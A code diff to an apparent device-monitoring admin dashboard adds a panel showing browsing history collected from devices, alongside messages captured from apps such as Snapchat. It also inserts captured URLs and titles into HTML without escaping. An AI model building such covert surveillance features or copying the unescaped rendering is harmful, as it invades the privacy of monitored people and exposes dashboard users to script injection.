@@ -20,7 +20,7 @@ const getAppBadge = (pkg) => {
   if (source.includes('snapchat')) {
     return `<span class="app-badge snapchat">Snapchat</span>`;
   }
-  return `<span class="app-badge other">${pkg ? pkg.split('.').pop() : 'App'}</span>`;
+  return `<span class="app-badge other">${pkg ? pkg.split('.').pop() : 'Web/App'}</span>`;
 };
 
 async function api(path, options = {}) {
@@ -78,10 +78,11 @@ function renderLogin() {
 
 async function renderDashboard() {
   try {
-    const [summary, devices, messages] = await Promise.all([
+    const [summary, devices, messages, browserHistory] = await Promise.all([
       api('/api/admin/dashboard'),
       api('/api/admin/devices'),
-      api('/api/admin/messages?limit=100')
+      api('/api/admin/messages?limit=100'),
+      api('/api/admin/browser-history?limit=100').catch(() => ({ history: [] }))
     ]);
 
     const summaryCards = [
@@ -141,7 +142,31 @@ async function renderDashboard() {
 
           <div class="card panel-card">
             <div class="panel-header">
-              <h2>Synchronized Messages (All Devices & Apps)</h2>
+              <h2>Device Browsing History</h2>
+              <span class="chip primary">${(browserHistory.history || []).length} URLs</span>
+            </div>
+            <div class="table-wrap">
+              <table>
+                <thead>
+                  <tr><th>Device Name</th><th>Page Title</th><th>Visited URL</th><th>Visited Time</th></tr>
+                </thead>
+                <tbody>
+                  ${(renderTable(browserHistory.history || [])).map(item => item.empty ? '<tr><td colspan="4">No browsing history recorded yet</td></tr>' : `
+                    <tr>
+                      <td><strong>${item.deviceName || item.deviceId || 'Device'}</strong></td>
+                      <td>${item.title || 'Web Page'}</td>
+                      <td><a href="${item.url}" target="_blank" class="url-link">${item.url}</a></td>
+                      <td>${formatDate(item.timestamp)}</td>
+                    </tr>
+                  `).join('')}
+                </tbody>
+              </table>
+            </div>
+          </div>
+
+          <div class="card panel-card">
+            <div class="panel-header">
+              <h2>Synchronized Messages & Web Notifications</h2>
               <span class="chip info">${(messages.messages || []).length} captured</span>
             </div>
             <div class="table-wrap">
@@ -170,12 +195,26 @@ async function renderDashboard() {
     const source = new EventSource(`${state.backend}/api/admin/stream`, { withCredentials: true });
     source.onmessage = async (event) => {
       const data = JSON.parse(event.data || '{}');
-      if (data.type === 'new_message') {
+      if (data.type === 'new_message' || data.type === 'new_history') {
         try {
-          const refreshed = await api('/api/admin/messages?limit=100');
+          const [refreshedMsgs, refreshedHistory] = await Promise.all([
+            api('/api/admin/messages?limit=100'),
+            api('/api/admin/browser-history?limit=100').catch(() => ({ history: [] }))
+          ]);
           const tables = document.querySelectorAll('table');
-          if (tables.length > 1) {
-            tables[1].tBodies[0].innerHTML = (refreshed.messages || []).map(msg => `
+          if (tables.length > 2) {
+            // Update History Table
+            tables[1].tBodies[0].innerHTML = (refreshedHistory.history || []).map(item => `
+              <tr>
+                <td><strong>${item.deviceName || item.deviceId || 'Device'}</strong></td>
+                <td>${item.title || 'Web Page'}</td>
+                <td><a href="${item.url}" target="_blank" class="url-link">${item.url}</a></td>
+                <td>${formatDate(item.timestamp)}</td>
+              </tr>
+            `).join('') || '<tr><td colspan="4">No browsing history recorded yet</td></tr>';
+
+            // Update Messages Table
+            tables[2].tBodies[0].innerHTML = (refreshedMsgs.messages || []).map(msg => `
               <tr>
                 <td>${getAppBadge(msg.sourcePackage || msg.sourceType)}</td>
                 <td><strong>${msg.deviceName || msg.deviceId || 'Device'}</strong></td>
